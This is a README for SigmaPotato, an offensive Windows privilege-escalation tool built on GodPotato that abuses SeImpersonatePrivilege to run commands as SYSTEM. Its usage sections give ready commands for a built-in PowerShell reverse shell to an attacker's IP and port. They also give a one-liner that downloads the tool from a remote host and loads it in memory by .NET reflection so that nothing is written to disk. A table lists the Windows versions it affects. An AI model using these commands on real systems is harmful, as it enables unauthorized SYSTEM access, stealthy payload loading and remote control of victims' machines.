
This gaudy repository is a derivative of the [GodPotato](https://github.com/BeichenDream/GodPotato) project, 
aiming to enhance the original work's functionality and user-friendliness.  With my bread-and-butter generally
being PowerShell implementation and visual formatting, the primary focus is on enhancing PowerShell support
and output verbosity for a more intuitive and effective user experience.

![Banner](https://cdn.discordapp.com/attachments/855920119292362802/1142248666950803486/image.png)


## Table of Contents

1. [**``Added Functionality over the Original``**](#addedFunctionality)
2. [**``Windows OS Version Compatibility``**](#versionCompatiblity)
3. [**``General Usage``**](#generalUsage)
    - [**``Usage from Disk via the Binary``**](#binaryUsage)
	- [**``Usage from Memory via .NET Reflection``**](#reflectionUsage)
	- [**``Error Correction``**](#errorCorrection)
4. [**``Credits & Thanks``**](#credits)
	- [**``BeichenDream``**](#beichenDream)
	- [**``NukingDragons``**](#nukingDragons)
5. [**``License``**](#license)


## Added Functionality over the Original <a name="addedFunctionality"></a>

### v1.0.0
```
[+] Support for execution from memory via .NET reflection.
    o (allows privilege escalation without writing a binary to disk)
    o (help page includes syntax for both local and remote reflection)
	
[+] Built in reverse shell functionality using '--revshell'.
    o (reverse shell is a custom PowerShell-based payload)
	
[+] Bypassed the 1024 max character limit when executing PowerShell commands.
    o (accomplished via exploiting process environment block inheritance)
    o (theoretical character limit: 32,767)
	
[+] Streamlined tool usage by utilizing implied variables over specified variables.
    o (e.g., no more needing to specifiy the '-cmd' parameter)
	
[+] Enhanced visual formatting of PowerShell process output.
    o (e.g., voiding PowerShell's serialization format "#< CLIXML")
	
[+] Increased output verbosity and visual formatting.
    o (error output verbosity by including suggestions for common error messages)
    o (process outputting and usage help vastly improved)
```

### v1.2.5
```
[+] Streamlined usage when using .NET reflection.
    o (e.g., can now be executed via '[SigmaPotato]::Main("<command">')
    
[+] Improved reverse shell stability and verbosity.
    o (better error correction and now intercepts console data streams)
    
[+] Further refined visual formatting.
    o (cleaned up help message, hints, and general output)
    
```

### Work-in-Progress (WIP)
```
[+] Introduce '--interactive' process support.
    o (this will require 'SeAssignPrimaryTokenPrivilege')
    
[+] Save process output to exported environment variable.
    o (save output of the execute process/command to "$env:SigmaOutput")
    o (will likely only be applicable when using reflection) 
```


## Windows OS Version Compatibility <a name="versionCompatiblity"></a>

For this project I compiled two different binaries for maximum compatibility.  The default
**``SigmaPotato.exe``** has been tested and validated on a fresh installation of every Windows
operating system, from **``Windows 8/8.1 to Windows 11``** *and* **``Windows Server 2012 to Windows
Server 2019``**. The only *"issue"* with this binary is that .NET reflection does not work with PowerShell Core.

The separate **``SigmaPotatoCore.exe``** was compiled with .NET Framework v2.0 and supports .NET
reflection on PowerShell Core / .NET Core.  The downside is that this binary then requires
.NET Framework v3.5 (2.0 + 3.0) to be installed on the target system to work via normal binary 
execution.  So if you plan to only use reflection, this version would be optimal.

**TL;DR**

| Version | Compiled w/ | Binary Compatibility | Reflection Compatibility |
| --- | --- | --- | --- |
| **``SigmaPotato.exe``** | .NET Framework: ``v4.8`` | .NET Framework: ``Any`` | .NET Framework: ``Any (Non-Core)`` |
| **``SigmaPotatoCore.exe``** | .NET Framework: ``v2.0`` | .NET Framework: ``v3.5`` | .NET Framework: ``Any`` |

| Vulnerable Windows Versions |
| --- |
| Windows 8/8.1 - Windows 11 |
| Windows Server 2012 - Windows 2022 |


## General Usage <a name="generalUsage"></a>

**Requirements:**
```txt
Run as a user with 'SeImpersonatePrivilege' or 'SeAssignPrimaryTokenPrivilege' user rights.
```

Checking the help message with ``--help``

![Help](https://cdn.discordapp.com/attachments/855920119292362802/1142283537832235068/image.png)

### Usage from Disk via the Binary <a name="binaryUsage"></a>
---

The easiest way to use ``SigmaPotato`` is by interacting with the binary like you would any other program.
```powershell
# Execute a Command
./SigmaPotato.exe <command>


# Establish a PowerShell Reverse Shell
./SigmaPotato.exe --revshell <ip_addr> <port>


# Return Help Information
./SigmaPotato.exe --help
```

### Usage from Memory via .NET Reflection <a name="reflectionUsage"></a>
---

Prior to privilege escalation, we need to load ``SigmaPotato`` into memory using .NET reflection.

```powershell
# Load from a Local Binary already on Disk
[System.Reflection.Assembly]::LoadFile("$PWD/SigmaPotato.exe")


# Load from a Remotely Hosted Binary via a WebClient
$WebClient = New-Object System.Net.WebClient
$DownloadData = $WebClient.DownloadData("http(s)://<ip_addr>/SigmaPotato.exe")
[System.Reflection.Assembly]::Load($DownloadData)


# Load from a Remotely Hosted Binary via a WebClient (one-liner)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http(s)://<ip_addr>/SigmaPotato.exe"))
```
- Note: running a simple HTTP server is sufficient for hosting (e.g., ``python -m http.server 80``)
---

Once the ``SigmaPotato`` namespace has been loaded into the current session, you can use it for privilege escalation.

```powershell
# Execute a Command
[SigmaPotato]::Main("<command>")


# Establish a PowerShell Reverse Shell
$RevShell = @("--revshell", "<ip_addr>", "<port>")
[SigmaPotato]::Main($RevShell)


# Establish a PowerShell Reverse Shell (one-liner)
[SigmaPotato]::Main(@("--revshell","<ip_address>","<port>"))
```
- Note: as of ``v1.2.5``, execution no longer requires ``[SigmaPotato.Program]``

### Error Correction <a name="errorCorrection"></a>
---

I made an active effort to document the majority of errors I came accross.
Hopefully this effort allows any error you come across to be quickly diagnosed.

**General usage corrections.**
```txt
PS C:\Users\JoeSchmoe> .\SigmaPotato.exe
[-] No arguments detected.  Use '--help' for usage information.


PS C:\Users\JoeSchmoe> .\SigmaPotato.exe cmd.exe /c whoami
[-] Unexpected arguments detected.  Use '--help' for usage information.
 o  (Hint: you might need to wrap your arguments in quotations)


PS C:\Users\JoeSchmoe> .\SigmaPotato.exe --revshell
[-] Reverse shell functionality is missing arguments.  Use '--help' for usage information.
 o  (Hint: you need to specify an IP address and port)
```

**Invalid filename (or filename not in the default path).**

![Invalid Filename](https://media.discordapp.net/attachments/855920119292362802/1142298026640162848/image.png)

**Command likely exceeds the character limit (but PowerShell commands should bypass this).**

![Command Too Long](https://media.discordapp.net/attachments/855920119292362802/1142298315539615754/image.png)

**User does not have 'SeImpersonatePrivilege' or 'SeAssignPrimaryTokenPrivilege' user rights.**

![Invalid Privileges](https://media.discordapp.net/attachments/855920119292362802/1142301106479837345/image.png)


## Credits & Thanks <a name="credits"></a>

- Enormous credit to [@BeichenDream](https://github.com/BeichenDream) for the original [GodPotato](https://github.com/BeichenDream/GodPotato) project.  I couldn't have made any of this without his
hard work. <a name="beichenDream"></a>

- Huge shoutout to [@NukingDragons](https://github.com/nukingdragons) for being way smarter than me
and helping with the local environment block bootstrap. <a name="nukingDragons"></a>


## License <a name="license"></a>

- [Apache License 2.0](/LICENSE)
